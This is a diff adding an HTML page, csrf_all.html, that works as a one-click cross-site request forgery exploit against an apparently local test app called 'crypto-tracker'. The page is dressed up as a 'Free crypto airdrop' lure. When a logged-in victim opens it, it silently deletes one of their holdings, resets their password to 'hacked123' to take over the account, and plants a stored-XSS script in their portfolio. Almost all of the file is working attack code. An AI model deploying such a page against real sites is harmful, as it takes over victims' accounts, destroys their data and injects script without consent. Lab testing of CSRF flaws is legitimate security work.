@@ -1,0 +1,54 @@
+<!doctype html>
+<!--
+  csrf_all.html — one-click CSRF combo (runs BOTH proof-of-concepts)
+
+  Open this single page as a logged-in victim and it fires everything:
+    1. deletes the victim's FIRST holding (dynamic id, scraped from their
+       dashboard — same trick as csrf_delete.html)
+    2. changes their account password to "hacked123"      -> account takeover
+    3. injects a stored-XSS holding into their portfolio
+
+  All state-changing endpoints lack a CSRF token and the session cookie has no
+  SameSite restriction, so the victim's session is (ab)used for all three.
+-->
+<html>
+<head><meta charset="utf-8"><title>Free crypto airdrop 🚀</title></head>
+<body>
+  <h1>Claiming your airdrop...</h1>
+  <p>Please wait.</p>
+
+  <iframe name="sink" style="display:none"></iframe>
+
+  <!-- VULN target: CSRF on password change (account takeover) -->
+  <form id="f1" action="http://localhost/crypto-tracker/profile.php" method="post" target="sink">
+    <input type="hidden" name="action" value="password">
+    <input type="hidden" name="password" value="hacked123">
+  </form>
+
+  <!-- VULN target: CSRF on add_holding, carrying a stored-XSS payload in notes -->
+  <form id="f2" action="http://localhost/crypto-tracker/add_holding.php" method="post" target="sink">
+    <input type="hidden" name="coin_id" value="1">
+    <input type="hidden" name="amount" value="0.1">
+    <input type="hidden" name="buy_price" value="1">
+    <input type="hidden" name="notes" value="&lt;script&gt;alert('csrf+xss')&lt;/script&gt;">
+  </form>
+
+  <script>
+    var APP = 'http://localhost/crypto-tracker';
+
+    (async function () {
+      // 1. Dynamic delete of the victim's first holding.
+      try {
+        var html = await fetch(APP + '/dashboard.php', { credentials: 'include' })
+                          .then(function (r) { return r.text(); });
+        var m = html.match(/delete_holding\.php\?id=(\d+)/);
+        if (m) { (new Image()).src = APP + '/delete_holding.php?id=' + m[1]; }
+      } catch (e) { /* silent */ }
+
+      // 2 + 3. Password change, then the stored-XSS holding (staggered so both land).
+      document.getElementById('f1').submit();
+      setTimeout(function () { document.getElementById('f2').submit(); }, 400);
+    })();
+  </script>
+</body>
+</html>
